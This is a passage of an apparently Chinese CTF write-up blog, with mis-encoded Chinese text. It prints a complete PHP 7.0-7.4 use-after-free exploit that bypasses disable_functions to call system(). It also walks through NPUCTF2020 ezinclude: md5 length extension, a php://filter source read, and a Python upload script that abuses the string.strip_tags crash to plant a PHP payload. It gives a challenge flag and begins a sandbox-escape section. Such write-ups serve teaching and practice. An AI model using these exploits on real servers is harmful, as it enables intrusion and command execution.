class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable</span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">// command</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span><span class="number">-1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è¯»å–ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727131148708.png"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><h3 id="hashé•¿åº¦æ‹“å±•æ”»å‡»"><a href="#hashé•¿åº¦æ‹“å±•æ”»å‡»" class="headerlink" title="hashé•¿åº¦æ‹“å±•æ”»å‡»"></a>hashé•¿åº¦æ‹“å±•æ”»å‡»</h3><p>æŸ¥çœ‹é¡µé¢æºä»£ç å‘ç°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äº<code>$nameå’Œ$pass</code>å¯æ§ï¼Œè€Œ<code>$secret</code>ä¸å¯æ§ï¼Œåˆ™å¯ä»¥ç”¨md5é•¿åº¦æ‹“å±•æ”»å‡»ç»•è¿‡ï¼Œ<a href="https://blog.csdn.net/qq_24966613/article/details/78638868?ops_request_misc=&request_id=&biz_id=102&utm_term=md5%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">å…·ä½“åŸç†çœ‹è¿™</a>ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727153912921.png"></p><p>å‘ç°å­˜åœ¨<code>flflflflag.php</code>æ–‡ä»¶ï¼Œç›´æ¥ç½‘é¡µæ‰“å¼€ä¼š404ï¼Œburpsuiteæ‰“å¼€ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727154017552.png"></p><h3 id="string-strip-tagsä¼ªåè®®ä¸Šä¼ æ–‡ä»¶"><a href="#string-strip-tagsä¼ªåè®®ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="string.strip_tagsä¼ªåè®®ä¸Šä¼ æ–‡ä»¶"></a>string.strip_tagsä¼ªåè®®ä¸Šä¼ æ–‡ä»¶</h3><p>èƒ½<code>include</code>é‚£å°±å…ˆæ‰”ä¸ªphpä¼ªåè®®ï¼Œçœ‹çœ‹<code>flflflflag.php</code>æºç ã€‚</p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>èƒ½å†™ä¸€å¥è¯å’Œå‘½ä»¤æ‰§è¡Œçš„ä¼ªåè®®éƒ½banæ‰äº†ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ä»ç„¶å¯ä»¥ç”¨<code>string.strip_tags</code>è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œ<a href="https://www.cnblogs.com/tr1ple/p/11301743.html">åŸç†çœ‹è¿™</a>ã€‚</p><blockquote><p>ä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshell</p></blockquote><p>å†™ä¸ªè„šæœ¬ä¸Šä¼ ï¼Œä¼ äºŒè¿›åˆ¶çš„ï¼Œå¯ä»¥ç›´æ¥ä¼ ğŸï¼Œä½†æ˜¯æˆ‘è¿™é‡Œå†™äº†ä¸ªphpinfo()è¯•è¯•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">data = [(<span class="string">&#x27;file&#x27;</span>, payload)]</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, files=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™é“é¢˜è¿˜ç»™äº†ä¸ª<code>dir.php</code>ï¼Œæ‰€ä»¥å¯ä»¥ä¸éœ€è¦è¿›è¡Œæ–‡ä»¶åçˆ†ç ´ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727160128599.png"></p><p>ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ï¼Œflagåœ¨phpinfoé‡Œå°±èƒ½çœ‹åˆ°ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727160306665.png"></p><blockquote><p>flag{3ec89c04-0dc3-41d4-9d05-3ca228e8f8cd}</p></blockquote><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><h3 id="VMæ²™ç›’æº¢å‡º"><a href="#VMæ²™ç›’æº¢å‡º" class="headerlink" title="VMæ²™ç›’æº¢å‡º"></a>VMæ²™ç›’æº¢å‡º</h3><p>é¢˜ç›®æç¤ºä¸æ˜¯PHPï¼Œé‚£å¯èƒ½å°±æ˜¯JSäº†ï¼Œç„¶åç»™å‡ºäº†<code>run.php</code>çš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span 